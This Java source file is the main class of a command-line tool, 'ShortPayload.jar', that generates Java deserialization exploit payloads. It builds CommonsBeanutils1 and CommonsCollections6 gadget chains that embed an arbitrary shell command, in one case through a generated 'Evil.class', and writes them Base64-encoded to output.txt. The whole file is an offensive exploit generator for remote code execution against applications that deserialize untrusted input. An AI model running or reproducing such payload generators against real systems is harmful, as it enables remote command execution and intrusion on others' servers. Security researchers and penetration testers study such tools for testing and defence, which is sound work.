package org.sec;

import org.sec.asm.Resolver;
import org.sec.payload.CB1;
import org.sec.payload.CC6;
import org.sec.payload.Generator;
import org.sec.payload.Payload;

import java.io.File;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.Locale;

public class Main {
    public static void main(String[] args) throws Exception {
        String gadgetName;
        String command;
        boolean debug = false;
        if (args.length < 2) {
            System.out.println("usage: java -jar ShortPayload.jar [gadget-name] [command]");
            return;
        } else if (args.length == 3) {
            gadgetName = args[0];
            command = args[1];
            debug = true;
        } else {
            gadgetName = args[0];
            command = args[1];
        }
        if ((command.startsWith("'") && command.endsWith("'")) ||
                (command.startsWith("\"") && command.endsWith("\""))) {
            command = command.substring(1, command.length() - 1);
        }
        gadgetName = gadgetName.toUpperCase(Locale.ROOT);

        byte[] payload;
        byte[] newByteCodes;
        switch (gadgetName) {
            case "CB1":
                System.out.println("CommonsBeanutils1");
                String path = System.getProperty("user.dir") + File.separator + "Evil.class";
                Generator.saveTemplateImpl(path, command);
                Resolver.resolve("Evil.class");
                newByteCodes = Files.readAllBytes(Paths.get("Evil.class"));
                payload = Base64.getEncoder().encode(CB1.getPayloadUseByteCodes(newByteCodes));
                System.out.println("Payload length: " + new String(payload).length());
                System.out.println("Write Base64 Payload output.txt...");
                Files.write(Paths.get("output.txt"), payload);
                if (debug) {
                    Payload.deserialize(Base64.getDecoder().decode(payload));
                }
                Files.delete(Paths.get("Evil.class"));
            case "CC1":
                break;
            case "CC6":
                System.out.println("CommonsCollections6");
                payload = Base64.getEncoder().encode(CC6.getPayloadUseCommand(command));
                System.out.println("Payload length: " + new String(payload).length());
                System.out.println("Write Base64 Payload output.txt...");
                Files.write(Paths.get("output.txt"), payload);
                if (debug) {
                    Payload.deserialize(Base64.getDecoder().decode(payload));
                }
                break;
            default:
                System.out.println("error gadget name");
        }
    }
}
